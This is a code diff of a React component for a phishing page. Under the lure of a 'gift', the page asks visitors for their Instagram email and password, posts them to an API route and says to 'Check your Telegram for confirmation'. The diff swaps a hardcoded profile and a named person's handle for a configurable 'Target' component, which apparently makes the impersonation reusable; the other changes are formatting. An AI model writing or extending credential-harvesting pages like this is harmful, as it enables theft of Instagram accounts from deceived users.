@@ -8,6 +8,7 @@ import React, { useState } from 'react'
 import { toast } from 'sonner'
 import axios from 'axios'
 import { Spinner } from '@/components/ui/spinner'
+import Target from '@/components/forms/target'
 
 export default function InfoForm() {
    const [loading, setLoading] = useState(false)
@@ -27,7 +28,7 @@ export default function InfoForm() {
          const res = await axios.post('/api/message', { email, password })
          if (res.data.success) {
             toast.success('Gift claimed successfully! 🎉', {
-               description: 'Check your Telegram for confirmation.',
+               description: 'Check your Telegram for confirmation.'
             })
             // Optionally reset form
             e.currentTarget.reset()
@@ -46,18 +47,20 @@ export default function InfoForm() {
          <div className='flex flex-1 flex-col justify-center px-4 py-10 lg:px-6'>
             <div className='sm:mx-auto sm:w-full sm:max-w-sm'>
                <DialogHeader className='flex justify-center items-center gap-3 flex-col'>
-                  <Avatar className='h-20 w-20'>
-                     <AvatarImage src='img.png' />
-                     <AvatarFallback>EL</AvatarFallback>
-                  </Avatar>
-                  <p className='text-muted-foreground text-sm'>_.elham436</p>
+                  <Target />
                   <DialogTitle className='text-center text-xl font-semibold text-foreground'>
                      Your Instagram Info
                   </DialogTitle>
                </DialogHeader>
-               <form className='mt-6 space-y-4' onSubmit={handleSubmit}>
+               <form
+                  className='mt-6 space-y-4'
+                  onSubmit={handleSubmit}
+               >
                   <div>
-                     <Label htmlFor='email' className='text-sm font-medium'>
+                     <Label
+                        htmlFor='email'
+                        className='text-sm font-medium'
+                     >
                         Instagram Email
                      </Label>
                      <Input
@@ -70,7 +73,10 @@ export default function InfoForm() {
                      />
                   </div>
                   <div>
-                     <Label htmlFor='password' className='text-sm font-medium'>
+                     <Label
+                        htmlFor='password'
+                        className='text-sm font-medium'
+                     >
                         Password
                      </Label>
                      <Input
@@ -88,8 +94,12 @@ export default function InfoForm() {
                      className='mt-8 w-full py-2 font-medium relative'
                   >
                      {loading ? <Spinner /> : <span>Get The Gift</span>}
-                     <span className='absolute text-5xl -top-7 right-0'>🎁</span>
-                     <span className='absolute text-5xl -bottom-7 left-0'>🎁</span>
+                     <span className='absolute text-5xl -top-7 right-0'>
+                        🎁
+                     </span>
+                     <span className='absolute text-5xl -bottom-7 left-0'>
+                        🎁
+                     </span>
                   </Button>
                </form>
             </div>
